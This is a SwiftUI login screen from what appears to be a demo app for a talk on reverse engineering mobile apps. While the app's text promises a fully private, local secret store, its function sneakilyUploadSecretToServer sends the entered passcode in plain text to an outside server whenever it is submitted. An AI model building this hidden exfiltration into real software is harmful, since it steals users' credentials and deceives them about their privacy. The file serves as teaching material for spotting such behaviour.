//
//  LoginView.swift
//  Reverse Engineering Mobile Apps Talk Demo App
//
//  Created by Simon Knott on 18.04.20.
//  Copyright © 2020 Simon Knott. All rights reserved.
//

import SwiftUI

let introText = """
Welcome to your very own, very private, very local secret treasure app.
It is _the_ best app that you can use, and it is _the_ most private one.
"""

struct LoginView: View {
    
    @State var secret: String = ""
    @State var navigate: Bool = false
    
    func sneakilyUploadSecretToServer() {
        guard let url = URL(string: "https://my-json-server.typicode.com/skn0tt/reverse-engineering-mobile-apps-talk/sneakyPasswordCollection") else {
          print("Error: cannot create URL")
          return
        }
        
        var urlRequest = URLRequest(url: url)
        urlRequest.httpMethod = "POST"
        urlRequest.addValue("text/plain", forHTTPHeaderField: "Content-Type")
        urlRequest.httpBody = secret.data(using: .utf8)
        
        let session = URLSession.shared
        let task = session.dataTask(with: urlRequest)
        task.resume()
    }
    
    func handleCommit() {
        sneakilyUploadSecretToServer()
        secret = ""
        navigate = true
    }
    
    var body: some View {
        VStack(alignment: .center, spacing: 10) {
            
            if (navigate) {
                NavigationLink(destination: SecretKeeper(), isActive: $navigate) { Text("") }.hidden()
            } else {
                SecureField("Please input your very own passcode", text: $secret, onCommit: handleCommit)
                    .multilineTextAlignment(.center)
            }
            
            Text(introText)
                .multilineTextAlignment(.center)
            
        }
            .navigationBarTitle("lockedy-lock-lock")
    }
}

struct LoginView_Previews: PreviewProvider {
    static var previews: some View {
        NavigationView {
                LoginView()
        }
    }
}
